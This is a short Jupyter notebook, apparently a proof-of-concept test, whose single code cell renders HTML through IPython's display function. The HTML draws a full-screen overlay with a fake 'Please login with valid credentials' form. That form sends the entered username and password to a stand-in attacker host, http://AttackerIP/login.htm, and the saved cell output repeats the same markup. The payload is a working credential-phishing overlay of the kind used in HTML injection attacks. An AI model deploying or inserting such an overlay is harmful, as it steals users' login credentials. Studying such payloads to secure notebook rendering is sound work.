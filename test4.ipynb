{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled0.ipynb",
      "provenance": [],
      "collapsed_sections": []
    },
    "language_info": {
      "name": "python"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "Owcq4SuS3Svk",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 37
        },
        "outputId": "80a76f92-e95e-485e-ff74-f03ae6ff7b1e"
      },
      "source": [
        "from IPython.display import display, HTML\n",
        "js='<div style=\"position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;\">Please login with valid credentials:<br><form name=\"login\" action=\"http://AttackerIP/login.htm\"><table><tr><td>Username:</td><td><input type=\"text\" name=\"username\"/></td></tr><tr><td>Password:</td><td><input type=\"text\" name=\"password\"/></td></tr><tr><td colspan=2 align=center><input type=\"submit\" value=\"Login\"/></td></tr></table></form></div>'\n",
        "display(HTML(js))"
      ],
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<div style=\"position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;\">Please login with valid credentials:<br><form name=\"login\" action=\"http://AttackerIP/login.htm\"><table><tr><td>Username:</td><td><input type=\"text\" name=\"username\"/></td></tr><tr><td>Password:</td><td><input type=\"text\" name=\"password\"/></td></tr><tr><td colspan=2 align=center><input type=\"submit\" value=\"Login\"/></td></tr></table></form></div>"
            ],
            "text/plain": [
              "<IPython.core.display.HTML object>"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "yaulpc0NoE3G"
      },
      "source": [
        ""
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}